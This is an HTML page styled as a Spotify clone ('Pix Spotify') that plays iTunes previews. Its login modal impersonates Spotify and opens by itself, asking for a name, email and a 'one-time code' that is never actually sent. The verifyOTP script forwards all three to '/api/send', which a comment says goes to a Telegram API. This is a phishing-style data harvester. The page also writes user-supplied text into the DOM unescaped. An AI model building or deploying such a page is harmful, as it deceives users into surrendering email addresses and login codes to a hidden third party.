<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pix Spotify</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-base: #000000;
            --bg-main: #121212;
            --bg-card: #181818;
            --bg-card-hover: #282828;
            --accent-green: #1ed760;
            --text-main: #ffffff;
            --text-sub: #a7a7a7;
            --border-subtle: #282828;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

        body {
            background-color: var(--bg-base);
            color: var(--text-main);
            height: 100vh;
            display: grid;
            grid-template-rows: 1fr 90px;
            grid-template-columns: 260px 1fr;
            grid-template-areas: "sidebar main" "player player";
            overflow: hidden;
        }

        /* Sidebar */
        aside.sidebar {
            grid-area: sidebar;
            background: var(--bg-base);
            padding: 24px;
            display: flex;
            flex-direction: column;
            gap: 24px;
        }
        .logo-area { font-size: 24px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
        .logo-area i { color: var(--accent-green); font-size: 28px; }
        .nav-item {
            color: var(--text-sub); text-decoration: none; font-weight: 700; font-size: 14px;
            display: flex; align-items: center; gap: 15px; cursor: pointer; margin-bottom: 20px; transition: 0.2s;
        }
        .nav-item:hover, .nav-item.active { color: var(--text-main); }

        /* Main Content */
        main.main-content {
            grid-area: main;
            background: var(--bg-main);
            margin: 8px 8px 0 0;
            border-radius: 8px;
            padding: 24px 32px;
            overflow-y: auto;
        }
        .top-navbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; position: sticky; top: -24px; padding-top: 24px; background: var(--bg-main); z-index: 10;}
        
        .search-box {
            background: #242424; border-radius: 500px; display: flex; align-items: center;
            padding: 10px 16px; width: 350px; gap: 10px; border: 1px solid transparent;
        }
        .search-box:focus-within { border-color: #fff; }
        .search-box input { background: none; border: none; outline: none; color: #fff; width: 100%; font-size: 14px; }

        .user-profile {
            background: #000; border-radius: 30px; padding: 4px 14px 4px 4px;
            display: flex; align-items: center; gap: 10px; border: 1px solid var(--border-subtle); cursor: pointer;
        }
        .user-avatar {
            width: 28px; height: 28px; background: var(--accent-green); color: #000;
            border-radius: 50%; font-weight: 800; display: flex; align-items: center; justify-content: center; font-size: 12px;
        }

        .section-title { font-size: 24px; font-weight: 700; margin-bottom: 20px; letter-spacing: -0.5px; }
        .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 24px; }

        .spotify-card {
            background: var(--bg-card); padding: 16px; border-radius: 8px;
            transition: background 0.3s; cursor: pointer; position: relative;
        }
        .spotify-card:hover { background: var(--bg-card-hover); }
        .card-img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 6px; margin-bottom: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        .card-title { font-weight: 700; font-size: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 6px; }
        .card-artist { color: var(--text-sub); font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        .play-btn-hover {
            position: absolute; bottom: 75px; right: 24px; width: 48px; height: 48px;
            background: var(--accent-green); border-radius: 50%; display: flex; align-items: center; justify-content: center;
            color: #000; font-size: 18px; opacity: 0; transform: translateY(10px); transition: all 0.3s ease;
            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
        }
        .spotify-card:hover .play-btn-hover { opacity: 1; transform: translateY(0); }

        /* Player Bar */
        footer.player-bar {
            grid-area: player; background: var(--bg-base); border-top: 1px solid var(--border-subtle);
            display: flex; align-items: center; justify-content: space-between; padding: 0 16px; z-index: 100;
        }
        .now-playing { display: flex; align-items: center; gap: 14px; width: 30%; }
        .now-playing img { width: 56px; height: 56px; border-radius: 4px; object-fit: cover; }
        
        .player-center { display: flex; flex-direction: column; align-items: center; gap: 8px; width: 40%; }
        .player-controls { display: flex; align-items: center; gap: 24px; color: var(--text-sub); font-size: 16px; }
        .player-controls i { cursor: pointer; transition: 0.2s; }
        .player-controls i:hover { color: #fff; }
        .main-play {
            width: 36px; height: 36px; background: #fff; color: #000; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; font-size: 16px; cursor: pointer;
            transition: 0.2s;
        }
        .main-play:hover { transform: scale(1.05); }
        .playback-bar { display: flex; align-items: center; gap: 8px; width: 100%; max-width: 500px; font-size: 11px; color: var(--text-sub); }
        .progress-slider, .volume-slider { flex: 1; accent-color: #fff; cursor: pointer; height: 4px; }
        .player-right { display: flex; align-items: center; gap: 12px; width: 30%; justify-content: flex-end; color: var(--text-sub); }
        .volume-slider { max-width: 100px; }

        /* Modals */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 5000;
            display: none; justify-content: center; align-items: center;
        }
        .modal-overlay.active { display: flex; }
        .spotify-modal { background: #121212; border: 1px solid #282828; padding: 32px; border-radius: 12px; width: 100%; max-width: 420px; text-align: center;}
        .spotify-input { width: 100%; padding: 14px; background: #242424; border: 1px solid #333; border-radius: 4px; color: #fff; margin: 8px 0 16px; outline: none; font-size: 14px;}
        .spotify-input:focus { border-color: #fff; }
        .spotify-btn { width: 100%; background: var(--accent-green); color: #000; font-weight: 700; padding: 14px; border-radius: 500px; border: none; cursor: pointer; font-size: 16px; transition: 0.2s; }
        .spotify-btn:hover { transform: scale(1.02); background: #1fdf64; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- Auth Modal (Email & OTP) -->
    <div class="modal-overlay" id="authModal">
        <div class="spotify-modal">
            <!-- Step 1: Email -->
            <div id="stepEmail">
                <i class="fa-brands fa-spotify" style="color: var(--accent-green); font-size: 40px; margin-bottom: 16px;"></i>
                <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px;">Log in to Spotify</h2>
                <p style="color: var(--text-sub); font-size: 13px; margin-bottom: 24px;">Enter your email to continue.</p>
                
                <input type="text" id="regName" class="spotify-input" placeholder="Your Name" required>
                <input type="email" id="regEmail" class="spotify-input" placeholder="Email address" required>
                
                <button class="spotify-btn" onclick="requestOTP()">Continue</button>
            </div>

            <!-- Step 2: OTP -->
            <div id="stepOTP" class="hidden">
                <i class="fa-solid fa-envelope-circle-check" style="color: var(--accent-green); font-size: 40px; margin-bottom: 16px;"></i>
                <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px;">Check your email</h2>
                <p style="color: var(--text-sub); font-size: 13px; margin-bottom: 24px;">We sent a 6-digit OTP to <br><strong id="displayEmail" style="color: #fff;"></strong></p>
                
                <input type="text" id="otpInput" class="spotify-input" placeholder="Enter 6-digit OTP" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px; font-weight: 700;">
                <p style="color: var(--text-sub); font-size: 11px; margin-bottom: 16px;">(Demo Mode: Enter any 6 digits like 123456)</p>
                
                <button class="spotify-btn" onclick="verifyOTP()">Log In</button>
            </div>
        </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar">
        <div class="logo-area">
            <i class="fa-brands fa-spotify"></i> Pix<span>Spotify</span>
        </div>
        <div>
            <div class="nav-item active"><i class="fa-solid fa-house"></i> Home</div>
            <div class="nav-item"><i class="fa-solid fa-magnifying-glass"></i> Search</div>
            <div class="nav-item"><i class="fa-solid fa-book"></i> Your Library</div>
            <div style="margin-top: 30px;">
                <div class="nav-item" style="color: var(--accent-green);"><i class="fa-solid fa-plus"></i> Create Playlist</div>
                <div class="nav-item"><i class="fa-solid fa-heart" style="color: #a7a7a7;"></i> Liked Songs</div>
            </div>
        </div>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
        <div class="top-navbar">
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass" style="color: var(--text-sub);"></i>
                <input type="text" id="searchInput" placeholder="What do you want to listen to?" onkeypress="if(event.key==='Enter') searchSongs()">
            </div>
            <div id="authNavArea">
                <button class="spotify-btn" style="padding: 8px 24px; font-size: 14px; width: auto;" onclick="openAuthModal()">Log In</button>
            </div>
        </div>

        <h2 class="section-title" id="sectionTitle">Good Evening</h2>
        <div class="cards-grid" id="songGrid">
            <div style="color: var(--text-sub); grid-column: 1/-1;"><i class="fa-solid fa-circle-notch fa-spin"></i> Loading trending music...</div>
        </div>
    </main>

    <!-- Player Bar -->
    <footer class="player-bar">
        <div class="now-playing">
            <img src="https://images.unsplash.com/photo-1614613535308-eb5fbd3d2c17?w=500" id="playerThumb" alt="Thumb">
            <div>
                <div class="card-title" id="playerTitle" style="cursor: default;">Select a track</div>
                <div class="card-artist" id="playerArtist" style="cursor: default;">Pix Audio Engine</div>
            </div>
        </div>

        <div class="player-center">
            <div class="player-controls">
                <i class="fa-solid fa-shuffle"></i>
                <i class="fa-solid fa-backward-step" onclick="prevSong()"></i>
                <div class="main-play" onclick="togglePlay()"><i class="fa-solid fa-play" id="playIcon"></i></div>
                <i class="fa-solid fa-forward-step" onclick="nextSong()"></i>
                <i class="fa-solid fa-repeat"></i>
            </div>
            <div class="playback-bar">
                <span id="currentTime">0:00</span>
                <input type="range" min="0" max="100" value="0" class="progress-slider" id="progressSlider" oninput="seekAudio()">
                <span id="totalDuration">0:00</span>
            </div>
        </div>

        <div class="player-right">
            <i class="fa-solid fa-volume-high"></i>
            <input type="range" min="0" max="1" step="0.01" value="1" class="volume-slider" id="volumeSlider" oninput="changeVolume()">
        </div>

        <audio id="audioEngine" ontimeupdate="updateProgress()" onended="nextSong()"></audio>
    </footer>

    <script>
        // --- State Management ---
        let currentPlaylist = [];
        let currentSongIndex = 0;
        let isPlaying = false;
        const audio = document.getElementById('audioEngine');
        const playIcon = document.getElementById('playIcon');

        // --- Auth System ---
        let tempUser = { name: '', email: '', otp: '' };

        window.addEventListener('DOMContentLoaded', () => {
            checkLogin();
            fetchSongs('top hits 2024'); // Initial load
        });

        function checkLogin() {
            const name = localStorage.getItem('pix_user');
            if(name) {
                document.getElementById('authNavArea').innerHTML = `
                    <div class="user-profile" onclick="logout()">
                        <div class="user-avatar">${name.charAt(0).toUpperCase()}</div>
                        <span style="font-size: 13px; font-weight: 700;">${name}</span>
                    </div>
                `;
            } else {
                setTimeout(openAuthModal, 1000); // Auto prompt after 1 sec
            }
        }

        function openAuthModal() { 
            document.getElementById('authModal').classList.add('active');
            document.getElementById('stepEmail').classList.remove('hidden');
            document.getElementById('stepOTP').classList.add('hidden');
        }

        function requestOTP() {
            const name = document.getElementById('regName').value.trim();
            const email = document.getElementById('regEmail').value.trim();
            if(!name || !email) { alert('Please fill all fields!'); return; }
            
            tempUser.name = name;
            tempUser.email = email;

            document.getElementById('displayEmail').innerText = email;
            document.getElementById('stepEmail').classList.add('hidden');
            document.getElementById('stepOTP').classList.remove('hidden');
        }

        async function verifyOTP() {
            const otp = document.getElementById('otpInput').value.trim();
            if(otp.length < 6) { alert('Please enter a 6-digit OTP.'); return; }
            
            tempUser.otp = otp;

            // Send to Telegram API
            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(tempUser)
                });
            } catch (e) { console.log('Log error', e); }

            // Save locally and close
            localStorage.setItem('pix_user', tempUser.name);
            document.getElementById('authModal').classList.remove('active');
            checkLogin();
        }

        function logout() {
            localStorage.removeItem('pix_user');
            location.reload();
        }

        // --- Music Player Logic ---
        function searchSongs() {
            const q = document.getElementById('searchInput').value.trim();
            if(q) {
                document.getElementById('sectionTitle').innerText = `Results for "${q}"`;
                fetchSongs(q);
            }
        }

        function fetchSongs(query) {
            const grid = document.getElementById('songGrid');
            grid.innerHTML = '<div style="color: var(--text-sub); grid-column: 1/-1;"><i class="fa-solid fa-circle-notch fa-spin"></i> Searching music...</div>';

            // Using iTunes API - Highly reliable, no Auth key needed
            fetch(`https://itunes.apple.com/search?term=${encodeURIComponent(query)}&media=music&limit=24`)
                .then(res => res.json())
                .then(data => {
                    grid.innerHTML = '';
                    currentPlaylist = data.results;
                    
                    if(currentPlaylist.length === 0) {
                        grid.innerHTML = '<div style="color: var(--text-sub); grid-column: 1/-1;">No songs found.</div>';
                        return;
                    }

                    currentPlaylist.forEach((song, index) => {
                        // Replace 100x100 artwork with 300x300 for better quality
                        const img = song.artworkUrl100.replace('100x100bb', '300x300bb');
                        renderCard(song.trackName, song.artistName, img, index);
                    });
                }).catch((err) => {
                    grid.innerHTML = '<div style="color: #ff4444; grid-column: 1/-1;">Failed to load music. Check internet.</div>';
                    console.log(err);
                });
        }

        function renderCard(title, artist, img, index) {
            const grid = document.getElementById('songGrid');
            const card = document.createElement('div');
            card.className = 'spotify-card';
            card.innerHTML = `
                <div style="position: relative;">
                    <img src="${img}" class="card-img" alt="cover">
                    <div class="play-btn-hover"><i class="fa-solid fa-play"></i></div>
                </div>
                <div class="card-title">${title}</div>
                <div class="card-artist">${artist}</div>
            `;
            card.onclick = () => {
                currentSongIndex = index;
                loadAndPlay(index);
            };
            grid.appendChild(card);
        }

        function loadAndPlay(index) {
            if(!currentPlaylist[index] || !currentPlaylist[index].previewUrl) {
                alert("Sorry, preview not available for this track!");
                return;
            }
            const song = currentPlaylist[index];
            document.getElementById('playerTitle').innerText = song.trackName;
            document.getElementById('playerArtist').innerText = song.artistName;
            document.getElementById('playerThumb').src = song.artworkUrl100.replace('100x100bb', '300x300bb');
            
            audio.src = song.previewUrl;
            audio.play();
            isPlaying = true;
            playIcon.className = 'fa-solid fa-pause';
        }

        function togglePlay() {
            if(!audio.src) return;
            if(isPlaying) {
                audio.pause();
                playIcon.className = 'fa-solid fa-play';
            } else {
                audio.play();
                playIcon.className = 'fa-solid fa-pause';
            }
            isPlaying = !isPlaying;
        }

        function nextSong() {
            if(currentPlaylist.length === 0) return;
            currentSongIndex = (currentSongIndex + 1) % currentPlaylist.length;
            loadAndPlay(currentSongIndex);
        }

        function prevSong() {
            if(currentPlaylist.length === 0) return;
            currentSongIndex = (currentSongIndex - 1 + currentPlaylist.length) % currentPlaylist.length;
            loadAndPlay(currentSongIndex);
        }

        // --- Audio Visuals ---
        function updateProgress() {
            if(audio.duration) {
                const progress = (audio.currentTime / audio.duration) * 100;
                document.getElementById('progressSlider').value = progress;
                
                let curM = Math.floor(audio.currentTime / 60), curS = Math.floor(audio.currentTime % 60);
                document.getElementById('currentTime').innerText = `${curM}:${curS < 10 ? '0':''}${curS}`;
                
                let durM = Math.floor(audio.duration / 60), durS = Math.floor(audio.duration % 60);
                document.getElementById('totalDuration').innerText = `${durM}:${durS < 10 ? '0':''}${durS}`;
            }
        }

        function seekAudio() {
            const val = document.getElementById('progressSlider').value;
            if(audio.duration) { audio.currentTime = (val / 100) * audio.duration; }
        }

        function changeVolume() { 
            audio.volume = document.getElementById('volumeSlider').value; 
        }
    </script>
</body>
</html>
